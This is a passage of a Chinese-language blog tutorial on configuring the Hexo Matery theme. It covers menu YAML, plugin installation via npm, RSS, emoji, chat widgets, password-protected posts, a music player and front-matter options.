<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">Index:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">Tags:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/tags</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">Categories:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/categories</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-bookmark</span></span><br><span class="line">  <span class="attr">Archives:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/archives</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">About:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/about</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-user-circle</span></span><br><span class="line">  <span class="attr">Friends:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/friends</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-address-book</span></span><br></pre></td></tr></table></figure>

<ul>
<li>二级菜单配置方法</li>
</ul>
<p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作<br>1.在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)<br>2.在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.<br>3.注意每个二级菜单模块前要加 <code>-</code>.<br>4.注意缩进格式</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">Index:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">Tags:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/tags</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">Categories:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/categories</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-bookmark</span></span><br><span class="line">  <span class="attr">Archives:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/archives</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">About:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/about</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-user-circle-o</span></span><br><span class="line">  <span class="attr">Friends:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/friends</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-address-book</span></span><br><span class="line">  <span class="attr">Medias:</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-list</span></span><br><span class="line">    <span class="attr">children:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Musics</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/musics</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Movies</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/movies</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-film</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Books</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/books</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-book</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Galleries</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/galleries</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-image</span></span><br></pre></td></tr></table></figure>

<p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了</p>
<h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 [hexo-prism-plugin]的 Hexo 插件来做代码高亮，安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm i -S hexo-prism-plugin</span><br></pre></td></tr></table></figure>

<p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">prism_plugin:</span></span><br><span class="line">  <span class="attr">mode:</span> <span class="string">&#x27;preprocess&#x27;</span>    <span class="comment"># realtime/preprocess</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">&#x27;tomorrow&#x27;</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">false</span>    <span class="comment"># default false</span></span><br><span class="line">  <span class="attr">custom_css:</span></span><br></pre></td></tr></table></figure>

<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 [hexo-generator-search] 的 Hexo 插件来做内容搜索，安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>

<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure>

<h3 id="中文链接转拼音"><a href="#中文链接转拼音" class="headerlink" title="中文链接转拼音"></a>中文链接转拼音</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 [hexo-permalink-pinyin]Hexo 插件使在生成文章时生成中文拼音的永久链接。</p>
<p>安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm i hexo-permalink-pinyin --save</span><br></pre></td></tr></table></figure>

<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">permalink_pinyin:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">separator:</span> <span class="string">&#x27;-&#x27;</span> <span class="comment"># default: &#x27;-&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注</strong>：除了此插件外，[hexo-abbrlink] 插件也可以生成非中文的链接</p>
</blockquote>
<h3 id="文章字数统计插件"><a href="#文章字数统计插件" class="headerlink" title="文章字数统计插件"></a>文章字数统计插件</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 [hexo-wordcount]插件</p>
<p>安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure>

<p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">postInfo:</span></span><br><span class="line">  <span class="attr">date:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">update:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">wordCount:</span> <span class="literal">true</span> <span class="comment"># 设置文章字数统计为 true.</span></span><br><span class="line">  <span class="attr">totalCount:</span> <span class="literal">true</span> <span class="comment"># 设置站点文章总字数统计为 true.</span></span><br><span class="line">  <span class="attr">min2read:</span> <span class="literal">true</span> <span class="comment"># 阅读时长.</span></span><br><span class="line">  <span class="attr">readCount:</span> <span class="literal">true</span> <span class="comment"># 阅读次数.</span></span><br></pre></td></tr></table></figure>

<h3 id="添加emoji表情支持"><a href="#添加emoji表情支持" class="headerlink" title="添加emoji表情支持"></a>添加emoji表情支持</h3><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 [hexo-filter-github-emojis]的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-filter-github-emojis --save</span><br></pre></td></tr></table></figure>

<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">githubEmojis:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">github-emoji</span></span><br><span class="line">  <span class="attr">inject:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">styles:</span></span><br><span class="line">  <span class="attr">customEmojis:</span></span><br></pre></td></tr></table></figure>

<h3 id="添加-RSS-订阅支持"><a href="#添加-RSS-订阅支持" class="headerlink" title="添加 RSS 订阅支持"></a>添加 RSS 订阅支持</h3><p>本主题中还使用到了 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvLWdlbmVyYXRvci1mZWVk">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>

<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">hub:</span></span><br><span class="line">  <span class="attr">content:</span></span><br><span class="line">  <span class="attr">content_limit:</span> <span class="number">140</span></span><br><span class="line">  <span class="attr">content_limit_delim:</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br></pre></td></tr></table></figure>

<p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了</p>
<h3 id="添加-DaoVoice-在线聊天功能"><a href="#添加-DaoVoice-在线聊天功能" class="headerlink" title="添加 DaoVoice 在线聊天功能"></a>添加 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL3d3dy5kYW92b2ljZS5pby8=">DaoVoice</a> 在线聊天功能</h3><p>前往 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL3d3dy5kYW92b2ljZS5pby8=">DaoVoice</a> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中。</p>
<h3 id="添加-Tidio-在线聊天功能"><a href="#添加-Tidio-在线聊天功能" class="headerlink" title="添加 Tidio 在线聊天功能"></a>添加 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly93d3cudGlkaW8uY29tLw==">Tidio</a> 在线聊天功能</h3><p>前往 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly93d3cudGlkaW8uY29tLw==">Tidio</a> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 文件中。</p>
<h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p>
<h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">theme.socialLink.github</span>) &#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= theme.socialLink.github %&gt;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;tooltipped&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">data-tooltip</span>=<span class="string">&quot;访问我的GitHub&quot;</span> <span class="attr">data-position</span>=<span class="string">&quot;top&quot;</span> <span class="attr">data-delay</span>=<span class="string">&quot;50&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fab fa-github&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9mb250YXdlc29tZS5jb20vaWNvbnM=">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p>
<ul>
<li>Facebook: <code>fab fa-facebook</code></li>
<li>Twitter: <code>fab fa-twitter</code></li>
<li>Google-plus: <code>fab fa-google-plus</code></li>
<li>Linkedin: <code>fab fa-linkedin</code></li>
<li>Tumblr: <code>fab fa-tumblr</code></li>
<li>Medium: <code>fab fa-medium</code></li>
<li>Slack: <code>fab fa-slack</code></li>
<li>Sina Weibo: <code>fab fa-weibo</code></li>
<li>Wechat: <code>fab fa-weixin</code></li>
<li>QQ: <code>fab fa-qq</code></li>
<li>Zhihu: <code>fab fa-zhihu</code></li>
</ul>
<blockquote>
<p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>5.11.0</code></p>
</blockquote>
<h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p>
<h3 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h3><p>主题 <code>config.yml</code> 配置文件中激活 <code>verifyPassword.enable: true</code> </p>
<p>在你所需要加密的文章中的 <code>Front-Matter</code> 中添加 <code>password</code> 属性，<code>password</code>的值为你的原密码经过 SHA256 加密后的值。访问文章就需要输入密码了，输入的为原密码。</p>
<h3 id="配置音乐播放器"><a href="#配置音乐播放器" class="headerlink" title="配置音乐播放器"></a>配置音乐播放器</h3><p>要支持音乐播放，在主题的 <code>_config.yml</code> 配置文件中激活music配置即可：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">music:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">听听音乐</span> <span class="comment">#非吸底模式有效</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">show:</span> <span class="string">听听音乐</span></span><br><span class="line">  <span class="attr">server:</span> <span class="string">netease</span>   <span class="comment">#require    music platform: netease, tencent, kugou, xiami, baidu</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">playlist</span>    <span class="comment">#require song, playlist, album, search, artist</span></span><br><span class="line">  <span class="attr">id:</span> <span class="number">503838841</span>     <span class="comment">#require    song id / playlist id / album id / search keyword</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span>       <span class="comment"># 开启吸底模式</span></span><br><span class="line">  <span class="attr">autoplay:</span> <span class="literal">false</span>   <span class="comment"># 是否自动播放</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">&#x27;#42b983&#x27;</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="string">&#x27;all&#x27;</span>       <span class="comment"># 音频循环播放, 可选值: &#x27;all&#x27;, &#x27;one&#x27;, &#x27;none&#x27;</span></span><br><span class="line">  <span class="attr">order:</span> <span class="string">&#x27;random&#x27;</span>   <span class="comment"># 音频循环顺序, 可选值: &#x27;list&#x27;, &#x27;random&#x27;</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="string">&#x27;auto&#x27;</span>   <span class="comment"># 预加载，可选值: &#x27;none&#x27;, &#x27;metadata&#x27;, &#x27;auto&#x27;</span></span><br><span class="line">  <span class="attr">volume:</span> <span class="number">0.7</span>       <span class="comment"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span></span><br><span class="line">  <span class="attr">listFolded:</span> <span class="literal">true</span>  <span class="comment"># 列表默认折叠</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>server</code>可选网<code>netease</code>（网易云音乐），<code>tencent</code>（QQ音乐），<code>kugou</code>（酷狗音乐），<code>xiami</code>（虾米音乐），</p>
<p><code>baidu</code>（百度音乐）。</p>
<p><code>type</code>可选<code>song</code>（歌曲），<code>playlist</code>（歌单），<code>album</code>（专辑），<code>search</code>（搜索关键字），<code>artist</code>（歌手）</p>
<p><code>id</code>获取方法：网页打开例如网易云音乐，点击一个推荐的歌单，地址栏会有一个<code>id</code>，<code>id</code>即为这串数字。其中search的id为搜索的关键字</p>
</blockquote>
<h3 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h3><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p>
<table>
<thead>
<tr>
<th>配置选项</th>
<th>默认值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>title</td>
<td><code>Markdown</code> 的文件标题</td>
<td>文章标题，强烈建议填写此选项</td>
</tr>
<tr>
<td>date</td>
<td>文件创建时的日期时间</td>
<td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td>
</tr>
<tr>
<td>author</td>
<td>根 <code>_config.yml</code> 中的 <code>author</code></td>
<td>文章作者</td>
</tr>
<tr>
<td>img</td>
<td><code>featureImages</code> 中的某个值</td>
<td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td>
</tr>
<tr>
<td>top</td>
<td><code>true</code></td>
<td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td>
</tr>
<tr>
<td>cover</td>
<td><code>false</code></td>
<td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td>
</tr>
<tr>
<td>coverImg</td>
<td>无</td>
<td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td>
</tr>
<tr>
<td>password</td>
<td>无</td>
<td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td>
</tr>
<tr>
<td>toc</td>
<td><code>true</code></td>
<td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td>
</tr>
<tr>
<td>mathjax</td>
<td><code>false</code></td>
<td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td>
</tr>
<tr>
<td>summary</td>
<td>无</td>
<td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td>
</tr>
<tr>
<td>categories</td>
<td>无</td>
<td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td>
</tr>
<tr>
<td>tags</td>
<td>无</td>
<td>文章标签，一篇文章可以多个标签</td>
</tr>
<tr>
<td>keywords</td>
<td>文章标题</td>
<td>文章关键字，SEO 时需要</td>
</tr>
<tr>
<td>reprintPolicy</td>
<td>cc_by</td>
<td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>注意</strong>:</p>
<ol>
<li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li>
<li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li>
<li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL3Rvb2wub3NjaGluYS5uZXQvZW5jcnlwdD90eXBlPTI=">开源中国在线工具</a>、<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL2VuY29kZS5jaGFodW8uY29tLw==">chahuo</a>、<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS90b29scy9oYXNoLmFzcHg=">站长工具</a>。</li>
<li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li>
</ol>
</blockquote>
<p>以下为文章的 <code>Front-matter</code> 示例</p>
<h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: typora-vue-theme主题介绍</span><br><span class="line">date: 2018-09-07 09:25:00</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: typora-vue-theme主题介绍</span><br><span class="line">date: 2018-09-07 09:25:00</span><br><span class="line">author: 赵奇</span><br><span class="line">img: /source/images/xxx.jpg</span><br><span class="line">top: true</span><br><span class="line">cover: true</span><br><span class="line">coverImg: /images/1.jpg</span><br><span class="line">password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</span><br><span class="line">toc: false</span><br><span class="line">mathjax: false</span><br><span class="line">summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</span><br><span class="line">categories: Markdown</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">  -</span> Typora</span><br><span class="line"><span class="bullet">  -</span> Markdown</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p>
<ul>
<li>菜单</li>
<li>我的梦想</li>
<li>首页的音乐播放器和视频播放器配置</li>
<li>是否显示推荐文章名称和按钮配置</li>
<li><code>favicon</code> 和 <code>Logo</code></li>
<li>个人信息</li>
<li>TOC 目录</li>
<li>文章打赏信息</li>
<li>复制文章内容时追加版权信息</li>
<li>MathJax</li>
<li>文章字数统计、阅读时长</li>
<li>点击页面的’爱心’效果</li>
<li>我的项目</li>
<li>我的技能</li>
<li>我的相册</li>
<li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li>
<li><a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL2J1c3VhbnppLmlicnVjZS5pbmZvLw==">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li>
<li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li>
</ul>
<h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>主题会有一层变换的颜色笼罩在背景图上，在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p>
